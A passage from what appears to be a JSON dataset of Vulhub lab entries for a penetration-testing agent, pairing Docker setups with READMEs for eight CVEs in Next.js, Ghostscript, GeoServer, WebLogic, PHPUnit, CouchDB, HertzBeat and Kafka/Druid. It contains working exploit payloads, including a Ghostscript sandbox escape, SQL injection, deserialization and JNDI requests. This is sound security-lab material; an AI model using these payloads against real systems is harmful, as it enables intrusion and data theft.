deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\nConnection: close\n\n\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2025-29927.md",
    "filenamenomd": "CVE-2025-29927",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/next.js/CVE-2025-29927/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/next.js/CVE-2025-29927/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 125 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/nextjs:15.2.2\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NODE_ENV=production\n\n```\n\n",
    "readme": "# Next.js Middleware Authorization Bypass (CVE-2025-29927)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNext.js is a popular React-based web application framework providing features such as server-side rendering, static site generation, and an integrated routing system. When configured to use middleware for authentication and authorization purposes, versions prior to 14.2.25 and 15.2.3 are vulnerable to an authorization bypass.\n\nThe vulnerability allows attackers to bypass middleware-based security controls by manipulating the `x-middleware-subrequest` header, potentially gaining unauthorized access to protected resources and sensitive data.\n\nReferences:\n\n- <https://github.com/advisories/GHSA-f82v-jwr5-mffw>\n- <https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware>\n- <https://nvd.nist.gov/vuln/detail/CVE-2025-29927>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable application based on Next.js 15.2.2:\n\n```\ndocker compose up -d\n```\n\nAfter the application starts, visit `http://your-ip:3000` you will be redirected to the login page. Input the default credentials `admin:password` to login and access the dashboard.\n\n## Vulnerability Reproduction\n\nIf you try to access the dashboard directly without legal credentials, you will be redirected to the login page:\n\n```\ncurl -i http://your-ip:3000\n```\n\n![](1.png)\n\nTo exploit the vulnerability, you can add the `x-middleware-subrequest` header with the value `middleware:middleware:middleware:middleware:middleware` in the request. The Next.js middleware will incorrectly process this header and bypass the authentication checks:\n\n```\ncurl -i -H \"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\" http://your-ip:3000\n```\n\n![](2.png)\n\nAs you can see, the dashboard is accessible without any authentication.\n\n> You can also try the header `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` if the previous payload doesn't work.\n"
  },
  {
    "filename": "CVE-2019-6116.md",
    "filenamenomd": "CVE-2019-6116",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/poc.png\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 188 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/imagemagick:7.0.8-27-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/poc.png\n\n- Extension: .png\n- Language: unknown\n- Size: 2482 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n%!PS\n% extract .actual_pdfpaintproc operator from pdfdict\n/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def\n\n/exploit {\n    (Stage 11: Exploitation...)=\n\n    /forceput exch def\n\n    systemdict /SAFER false forceput\n    userparams /LockFilePermissions false forceput\n    systemdict /userparams get /PermitFileControl [(*)] forceput\n    systemdict /userparams get /PermitFileWriting [(*)] forceput\n    systemdict /userparams get /PermitFileReading [(*)] forceput\n\n    % update\n    save restore\n\n    % All done.\n    stop\n} def\n\nerrordict /typecheck {\n    /typecount typecount 1 add def\n    (Stage 10: /typecheck #)=only typecount ==\n\n    % The first error will be the .knownget, which we handle and setup the\n    % stack. The second error will be the ifelse (missing boolean), and then we\n    % dump the operands.\n    typecount 1 eq { null } if\n    typecount 2 eq { pop 7 get exploit } if\n    typecount 3 eq { (unexpected)= quit }  if\n} put\n\n% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some\n% executable arrays onto the operand stack that contain .forceput, but are not\n% marked as executeonly or pseudo-operators.\n%\n% The routine was attempting to pass them to ifelse, but we can cause that to\n% fail because when the routine was declared, it used `bind` but many of the\n% names it uses are not operators and so are just looked up in the dictstack.\n%\n% This means we can push a dict onto the dictstack and control how the routine\n% works.\n<<\n    /typecount      0\n    /PDFfile        { (Stage 0: PDFfile)= currentfile }\n    /q              { (Stage 1: q)= } % no-op\n    /oget           { (Stage 3: oget)= pop pop 0 } % clear stack\n    /pdfemptycount  { (Stage 4: pdfemptycount)= } % no-op\n    /gput           { (Stage 5: gput)= }  % no-op\n    /resolvestream  { (Stage 6: resolvestream)= } % no-op\n    /pdfopdict      { (Stage 7: pdfopdict)= } % no-op\n    /.pdfruncontext { (Stage 8: .pdfruncontext)= 0 1 mark } % satisfy counttomark and index\n    /pdfdict        { (Stage 9: pdfdict)=\n        % cause a /typecheck error we handle above\n        true\n    }\n>> begin <<>> <<>> { .actual_pdfpaintproc } stopped pop\n\n(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=\n\n% Demonstrate reading a file we shouldnt have access to.\n(/etc/passwd) (r) file dup 64 string readline pop == closefile\n\n(Attempting to execute a shell command...)= flush\n\n% run command\n(%pipe%id > /tmp/success) (w) file closefile\n\n(All done.)=\n\nquit\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2019-6116/index.php\n\n- Extension: .php\n- Language: php\n- Size: 472 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n\nif (!empty($_FILES)):\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) {\n    die('Unsupported filetype uploaded.');\n}\n\n$size = shell_exec(\"identify -format '%w x %h' {$_FILES['file_upload']['tmp_name']}\");\n\necho \"Image size is: $size\";\n\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# GhostScript Sandbox Bypass Command Execution (CVE-2019-6116)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.\n\nOn January 23rd, 2019, Artifex officially merged six fixes into the master branch of GhostScript to address CVE-2019-6116. This vulnerability was reported by Google security researcher Tavis on December 3rd, 2018. The vulnerability allows attackers to bypass GhostScript's security sandbox, leading to arbitrary command execution and file reading capabilities.\n\nReferences:\n\n- <https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2>\n- <https://www.anquanke.com/post/id/170255>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable environment (including GhostScript 9.26 and ImageMagick 7.0.8-27):\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080` to see an upload component.\n\n## Vulnerability Reproduction\n\nUpload the provided [POC](poc.png) file to execute the command `id > /tmp/success`.\n\n![](1.png)\n\nYou can also test this vulnerability using the command line:\n\n```\ndocker run -it --rm --name uu -v `pwd`/poc.png:/tmp/poc.png vulhub/imagemagick:7.0.8-27-php identify /tmp/poc.png\n```\n\nThe command will be successfully executed.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2023-25157.md",
    "filenamenomd": "CVE-2023-25157",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2023-25157/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2023-25157/startup.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2023-25157/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 321 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/geoserver:2.22.1\n   depends_on:\n    - postgres\n   ports:\n    - \"8080:8080\"\n   volumes:\n     - ./startup.sh:/startup.sh\n   command: bash /startup.sh\n postgres:\n   image: postgis/postgis:14-3.3-alpine\n   environment: \n    - POSTGRES_PASSWORD=vulhub\n    - POSTGRES_DB=geoserver\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2023-25157/startup.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 1688 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nAUTH=\"admin:geoserver\"\n/mnt/geoserver/bin/startup.sh &\nGEOSERVER_PID=$!\n\nSERVER_ALIVE=$(curl -s --output /dev/null -u \"$AUTH\" -XGET --write-out \"%{http_code}\" http://localhost:8080/geoserver/rest/about/status)\nwhile [ \"$SERVER_ALIVE\" -ne 200 ]\ndo\n  echo \"geoserver is not ready yet, waiting for 1 second...\"\n  sleep 1\n  SERVER_ALIVE=$(curl -s --output /dev/null -u \"$AUTH\" -XGET --write-out \"%{http_code}\" http://localhost:8080/geoserver/rest/about/status)\ndone\n\nVULHUB_EXISTS=$(curl -s --output /dev/null -u \"$AUTH\" -XGET --write-out \"%{http_code}\" http://localhost:8080/geoserver/rest/workspaces/vulhub)\nif [ \"${VULHUB_EXISTS}\" -eq 200 ]; then\n    echo \"vulhub wordspace already exists\"\nelse\n    # refer to <https://github.com/geoserver/geoserver-history/blob/master/doc/en/user/source/restconfig/rest-config-examples/rest-config-examples-curl.rst>\n    curl -XPOST -u \"$AUTH\" -H \"Content-type: application/json\" -d '{\"workspace\":{\"name\":\"vulhub\"}}' http://localhost:8080/geoserver/rest/workspaces\n    curl -u \"$AUTH\" -XPOST -H 'Content-Type: application/json' \\\n        -d '{\"dataStore\":{\"name\":\"pg\",\"connectionParameters\":{\"host\":\"postgres\",\"port\":5432,\"database\":\"geoserver\",\"user\":\"postgres\",\"passwd\":\"vulhub\",\"dbtype\":\"postgis\",\"createDatabase\":true}}}' \\\n        http://localhost:8080/geoserver/rest/workspaces/vulhub/datastores\n    curl -u \"$AUTH\" -XPOST -H 'Content-Type: application/json' -d '{\"featureType\":{\"name\":\"example\",\"attributes\":{\"attribute\":[{\"name\":\"name\",\"binding\":\"java.lang.String\"}]}}}' http://localhost:8080/geoserver/rest/workspaces/vulhub/datastores/pg/featuretypes\n    echo \"target geoserver is initialized successfully\"\nfi\n\nwait $GEOSERVER_PID\n\n```\n\n",
    "readme": "# GeoServer OGC Filter SQL Injection (CVE-2023-25157)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.\n\nIn the version prior to 2.22.1 and 2.21.4, there is a SQL injection issue that was found in the filter and function expressions defined by the Open Geospatial Consortium (OGC) standards.\n\nReferences:\n\n- <https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158>\n- <https://github.com/advisories/GHSA-7g5f-wrx8-5ccf>\n\n## Vulnerable environment\n\nExecute following command to start a GeoServer instance 2.22.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can browse the default page of GeoServer at `http://your-ip:8080/geoserver`.\n\n## Exploit\n\nFirst of all, you have to find a existing workspace that contains PostGIS datastore before you exploit the vulnerability. Vulhub's GeoServer instance already have a PostGIS datastore:\n\n- Workspace name: `vulhub`\n- Data store name: `pg`\n- Feature type (table) name: `example`\n- One of attribute from feature type: `name`\n\nExploit the server by this simple URL:\n\n```\nhttp://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true\n```\n\n![](1.png)\n\nAs you can see, the version of PostgreSQL has been retrieved from GeoServer by SQL injection.\n"
  },
  {
    "filename": "CVE-2023-21839.md",
    "filenamenomd": "CVE-2023-21839",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2023-21839/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2023-21839/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n weblogic:\n   image: vulhub/weblogic:12.2.1.3-2018\n   ports:\n    - \"7001:7001\"\n\n```\n\n",
    "readme": "# WebLogic Pre-Auth Remote Command Execution (CVE-2023-21839)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOracle WebLogic Server is a leading Java EE application server widely used in enterprise environments.\n\nIn the [Oracle Critical Patch Update Advisory - January 2023](https://www.oracle.com/security-alerts/cpujan2023.html), Oracle fixed a critical vulnerability (CVE-2023-21839) affecting WebLogic Server versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0.\n\nCVE-2023-21839 allows unauthenticated remote attackers to perform JNDI lookup operations via the T3 or IIOP protocol without authorization. If the JDK version is too low or there are available deserialization gadgets (javaSerializedData) on the server, this can lead to remote code execution.\n\nReferences:\n\n- <https://www.oracle.com/security-alerts/cpujan2023.html>\n- <https://nvd.nist.gov/vuln/detail/CVE-2023-21839>\n- <https://github.com/houqe/POC_CVE-2023-21839>\n\n## Environment Setup\n\nStart a Weblogic server 12.2.1.3 by executing the following command:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:7001/console` to access the WebLogic admin console login page.\n\n## Vulnerability Reproduction\n\nYou can use the public exploit from <https://github.com/houqe/POC_CVE-2023-21839> to reproduce the vulnerability.\n\n```shell\npython CVE-2023-21839.py -ip 192.168.25.129 -p 7001 -l ldap://craft.ldap.tld/test\n```\n\nIf the exploit is successful, you will see DNS queries or LDAP requests from the target server, as shown below:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-9841.md",
    "filenamenomd": "CVE-2017-9841",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/phpunit/CVE-2017-9841/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/phpunit/CVE-2017-9841/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 85 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/phpunit:5.6.2\n   ports:\n    - \"8080:80\"\n```\n\n",
    "readme": "# PHPUnit Remote Code Execution (CVE-2017-9841)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPHPUnit is a programmer-oriented testing framework for PHP.\n\n`Util/PHP/eval-stdin.php` in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a `<?php` substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` URI.\n\nThe `Util/PHP/eval-stdin.php`'s vulnerable code:\n\n```php\neval('?>'.file_get_contents('php://input'));\n```\n\nReference links:\n\n- http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/\n- https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/\n\n## Vulnerable environment\n\nExecute following command to start a Apache web server, which contains the PHPUnit 5.6.2 in the Web directory.\n\n```\ndocker compose up -d\n```\n\nOpen the `http://your-ip:8080` to see the index page util Web server is running.\n\n## Exploit\n\nSend the request to `http://your-ip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`, which contains any PHP code within the body:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-12635.md",
    "filenamenomd": "CVE-2017-12635",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12635/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12635/init.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12635/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 406 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  couchdb:\n    image: vulhub/couchdb:2.1.0\n    ports:\n      - \"5984:5984\"\n    environment: \n      COUCHDB_USER: admin\n      COUCHDB_PASSWORD: password\n  initd:\n    image: buildpack-deps:focal-curl\n    command: \"bash /init.sh\"\n    environment: \n      COUCHDB_URL: couchdb:5984\n      COUCHDB_AUTH: admin:password\n    volumes:\n      - ./init.sh:/init.sh\n    depends_on:\n      - couchdb\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12635/init.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 346 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nCOUCHDB_URL=${COUCHDB_URL:-\"couchdb:5984\"}\nCOUCHDB_AUTH=${COUCHDB_AUTH:-\"admin:password\"}\n\nwhile ! curl -m 5 \"${COUCHDB_URL}\"; do\n    sleep 1\ndone\n\ncurl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_users\ncurl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_replicator\ncurl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_global_changes\n\n```\n\n",
    "readme": "# Apache Couchdb Remote Privilege Escalation (CVE-2017-12635)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.\n\nDue to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit `_users` documents with duplicate keys for `roles` used for access control within the database, including the special case `_admin` role, that denotes administrative users.\n\nReference link.\n\n - https://justi.cz/security/2017/11/14/couchdb-rce-npm.html\n - https://www.exploit-db.com/exploits/44498\n - http://bobao.360.cn/learning/detail/4716.html\n\n## Setup Environment\n\nCompile and start environment.\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, browse ``http://your-ip:5984/_utils/`` to see a web page, which means Couchdb has been started successfully. But you can do nothing without authentication.\n\n## Exploit\n\nThis is a normal request to add a user.\n\n```\nPUT /_users/org.couchdb.user:vulhub HTTP/1.1\nHost: your-ip:5984\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 90\n\n{\n  \"type\": \"user\",\n  \"name\": \"vulhub\",\n  \"roles\": [\"_admin\"],\n  \"password\": \"vulhub\"\n}\n```\n\nAs you can see, a 403 error is returned: `{\"error\": \"forbidden\", \"reason\": \"Only _admin may set roles\"}`, which means only administrator can use the endpoint.\n\n![](1.png)\n\nTo bypass the restriction by sending a request containing duplicate **roles**.\n\n```\nPUT /_users/org.couchdb.user:vulhub HTTP/1.1\nHost: your-ip:5984\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 108\n\n{\n  \"type\": \"user\",\n  \"name\": \"vulhub\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"vulhub\"\n}\n```\n\nSuccessfully created a user `vulhub`, with the password `vulhub`.\n\n![](2.png)\n\nLog in.\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2024-42323.md",
    "filenamenomd": "CVE-2024-42323",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/hertzbeat/CVE-2024-42323/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/hertzbeat/CVE-2024-42323/poc.yaml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/hertzbeat/CVE-2024-42323/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 108 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  hertzbeat:\n    image: vulhub/hertzbeat:1.4.4\n    ports:\n      - \"1157:1157\"\n      - \"5005:5005\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/hertzbeat/CVE-2024-42323/poc.yaml\n\n- Extension: .yaml\n- Language: yaml\n- Size: 261 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\n!!org.h2.jdbc.JdbcConnection [ \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\\"touch /tmp/success\\\")\\\\; }$$\\\\;CALL EXEC ()\\\\;\", [], \"a\", \"b\", false ]\n```\n\n",
    "readme": "# Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache HertzBeat is an open-source real-time monitoring and alarm tool that supports monitoring of operating systems, middleware, databases, and more through its web interface.\n\nIn versions prior to 1.6.0, HertzBeat uses a vulnerable version of SnakeYAML library for parsing YAML files. When authenticated users import new monitoring types through the `/api/monitors/import` or `/api/alert/defines/import` APIs, they can provide specially crafted YAML content that triggers deserialization of untrusted data, potentially leading to remote code execution on the target system.\n\nReferences:\n\n- <https://forum.butian.net/article/612>\n- <https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx>\n- <https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable HertzBeat 1.4.4 instance:\n\n```\ndocker compose up -d\n```\n\nAfter the service is started, you can access the HertzBeat dashboard at `http://your-ip:1157/dashboard`. The default login credentials are:\n\n- Username: `admin`\n- Password: `hertzbeat`\n\n## Vulnerability Reproduction\n\nFirst prepare a malicious YAML file that filename ends with `.yaml`:\n\n```yaml\n!!org.h2.jdbc.JdbcConnection [ \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\\"touch /tmp/success\\\")\\\\; }$$\\\\;CALL EXEC ()\\\\;\", [], \"a\", \"b\", false ]\n```\n\nThen log into the HertzBeat dashboard, navigate to any monitor page and locate the import button. The interface allows users to import monitor configurations through YAML files, upload the malicious YAML file:\n\n![Locate the import button](1.png)\n\nWhen the malicious YAML file is imported through the web interface, HertzBeat will attempt to deserialize its contents, triggering the remote code execution:\n\n![Import the malicious YAML file](2.png)\n\nIf successful, the payload will execute on the target system. In this example, we can verify the execution by checking for the presence of a newly created file in the container:\n\n![Verify code execution](3.png)\n"
  },
  {
    "filename": "CVE-2023-25194.md",
    "filenamenomd": "CVE-2023-25194",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/kafka/CVE-2023-25194/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/kafka/CVE-2023-25194/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/apache-druid:25.0.0\n   ports:\n    - \"8888:8888\"\n\n```\n\n",
    "readme": "# Apache Kafka Clients JNDI injection RCE (CVE-2023-25194)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Kafka is an open-source distributed event streaming platform that is used for real-time data streaming and processing. Kafka clients are a set of Java libraries that allow you to produce and consume messages from Apache Kafka.\n\nIn the version prior to 3.3.2, there is a JNDI injection issue in the Apache Kafka clients if an attacker is able to set the `sasl.jaas.config` property for any of the connector's Kafka clients to `com.sun.security.auth.module.JndiLoginModule`. It will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization of untrusted data (or) RCE vulnerability when there are gadgets in the classpath.\n\nBecause this issue exists in a Java library, we have to find a real world software that is using the kafka-clients.\n\nThis software is Apache Druid, which is depended on kafka-clients to connect to one of its datasources. This guide is demonstrates how to exploit CVE-2023-25194 in the Apache Druid server.\n\nReferences:\n\n- <https://nvd.nist.gov/vuln/detail/CVE-2023-25194>\n- <https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml>\n- <https://hackerone.com/reports/1529790>\n\n## Vulnerable Environment\n\nExecute following command to start a Apache Druid server 25.0.0 which is depended on kafka-clients 3.3.1:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.\n\n## Exploit\n\nFor vulnerability exploitation, you can use [Java Chains](https://github.com/vulhub/java-chains). First, follow the [Quick Start](https://java-chains.vulhub.org/docs/guide) guide to set up Java Chains. Then, refer to the [JNDI Basic Exploitation Guide](https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload) and following screenshot to configure the command `id > /tmp/success`, generate a JNDI LDAP URL Payload that will be used in the attack.\n\n![](1.png)\n\nPaste the evil LDAP url into following request and send it:\n\n```\nPOST /druid/indexer/v1/sampler?for=connect HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 1405\n\n{\n    \"type\":\"kafka\",\n    \"spec\":{\n        \"type\":\"kafka\",\n        \"ioConfig\":{\n            \"type\":\"kafka\",\n            \"consumerProperties\":{\n                \"bootstrap.servers\":\"127.0.0.1:6666\",\n                \"sasl.mechanism\":\"SCRAM-SHA-256\",\n                \"security.protocol\":\"SASL_SSL\",\n                \"sasl.jaas.config\":\"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\\"ldap://java-chains:50389/x\\\" useFirstPass=\\\"true\\\" serviceName=\\\"x\\\" debug=\\\"true\\\" group.provider.url=\\\"xxx\\\";\"\n            },\n            \"topic\":\"test\",\n            \"useEarliestOffset\":true,\n            \"inputFormat\":{\n                \"type\":\"regex\",\n                \"pattern\":\"([\\\\s\\\\S]*)\",\n                \"listDelimiter\":\"56616469-6de2-9da4-efb8-8f416e6e6965\",\n                \"columns\":[\n                    \"raw\"\n                ]\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"sample\",\n            \"timestampSpec\":{\n                \"column\":\"!!!_no_such_column_!!!\",\n                \"missingValue\":\"1970-01-01T00:00:00Z\"\n            },\n            \"dimensionsSpec\":{\n\n            },\n            \"granularitySpec\":{\n                \"rollup\":false\n            }\n        },\n        \"tuningConfig\":{\n            \"type\":\"kafka\"\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":500,\n        \"timeoutMs\":15000\n    }\n}\n```\n\n![](2.png)\n\nAs you can see, `id > /tmp/success` was executed successfully:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2018-15473.md",
    "filenamenomd": "CVE-2018-15473",
